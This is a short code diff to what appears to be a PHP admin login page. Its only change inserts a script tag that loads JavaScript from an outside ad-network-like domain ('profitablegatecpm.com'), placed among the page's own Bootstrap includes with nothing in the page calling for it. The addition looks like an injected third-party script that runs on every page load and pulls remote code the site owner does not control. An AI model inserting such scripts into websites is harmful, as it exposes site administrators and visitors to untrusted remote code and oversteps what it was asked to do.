@@ -127,7 +127,8 @@ if (isset($_POST['adminlogin'])) {
 
         </div>
 
-    </div>
+    </div>  
+    <script type='text/javascript' src='//pl22576702.profitablegatecpm.com/4d/bc/5a/4dbc5adc59f65313f42b4fffbc286709.js'></script>
 
     <!-- Bootstrap core JavaScript-->
     <script src="vendor/jquery/jquery.min.js"></script>
